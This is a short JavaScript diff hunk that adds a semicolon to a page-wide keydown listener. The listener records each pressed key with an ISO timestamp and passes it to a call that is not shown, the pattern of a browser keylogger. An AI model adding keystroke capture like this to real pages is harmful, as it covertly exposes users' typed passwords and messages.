@@ -7,5 +7,5 @@ document.addEventListener("keydown", function(key){
             key: key.key,
             datetime: new Date().toISOString()
         })                    
-    })
+    });
 })
